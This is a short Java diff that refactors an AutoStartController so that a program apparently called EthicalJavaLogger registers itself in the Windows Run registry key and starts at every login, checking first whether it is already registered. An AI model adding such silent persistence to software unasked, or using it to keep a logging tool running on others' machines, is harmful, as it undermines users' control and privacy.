@@ -9,14 +9,14 @@ public class AutoStartController {
     public void configureAutoStart() {
         String registryKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
         String jarPath = EthicalJavaLogger.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-        AutoStartService autoStartService = new AutoStartService(registryKey, new File(jarPath).getAbsolutePath());
-        autoStartService.registerToStartWithWindows();
-        /*if (!autoStartService.verificarRegistro()) {
-            autoStartService.registrarParaIniciarComWindows();
+        AutoStartService autoStartService = new AutoStartService(new File(jarPath).getAbsolutePath());
+        
+        if (!autoStartService.checkRegistry()) {
+            autoStartService.registerToStartWithWindows();
             System.out.println("Registrado para iniciar com o Windows.");
         } else {
             System.out.println("Já registrado para iniciar com o Windows.");
-        }*/
+        }
     }
     
 }
